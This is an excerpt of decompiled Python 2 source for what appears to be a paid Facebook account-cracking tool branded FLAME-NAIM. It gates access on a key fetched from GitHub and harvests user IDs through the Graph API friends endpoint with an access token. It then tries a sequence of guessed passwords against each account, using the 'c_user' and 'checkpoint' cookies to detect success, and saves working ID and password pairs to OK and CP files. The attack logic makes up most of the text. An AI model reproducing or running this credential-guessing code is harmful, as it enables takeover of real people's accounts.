...
# Time Succes decompile : 2022-03-15 09:45:13.779936
...
\x1b[1;93m##   ### ##     ##  ##  ##     ##
\033[1;32m##    ## ##     ## #### ##     ##
\033[1;30m______________________________________________________
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/.flame.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
    ...
    r1=requests.get("https://raw.githubusercontent.com/FLAME-CYBER-404/approve/main/File.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print ""
    print 39*'~'
    print "\x1b[1;32m[1]   Public Cloning      \x1b[1;32m(Login)"
    print "\x1b[1;30m[2]   Random Cloning     \x1b[1;32m (No Login)"
    print "\x1b[1;32m[3]   File Cloning       \x1b[1;32m (No Login)"
    print "\x1b[1;30m[4]   File Making Menu\x1b[1;32m    (Login)"
    print "\x1b[1;32m[5]   Check Subscription "
    print "\x1b[1;30m[6]   Update Tools"
    print "\x1b[1;32m[7]   For Any Help Massage WhatsApp"
    print 43*'~'
    print "\x1b[1;33m[*]\x1b[1;33m For Need Any Help Type 7 And \x1b[1;33mWhatsApp Me  "
    print 43*'~'
    main_input()
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In Flame Naim Paid Commands ")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[FLAME-NAIM-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[FLAME-NAIM-CP] "+coc+user + " | " + pass1
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From NAIM : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass2
                        ok=open('YOUSAF-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass2
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass3
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass3
                                    cp=open('IMTIAZ-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass4
                                        ok=open('IMTIAZ-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass4
                                            cp=open('IMTIAZ-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass5
                                                ok=open('IMTIAZ-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass5
                                                    cp=open('IMTIAZ-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[FLAME-NAIM-OK] "+uid + " | " + pass6
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[FLAME-NAIM-CP] "+uid + " | " + pass6
                                                            cp=open('IMTIAZ-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
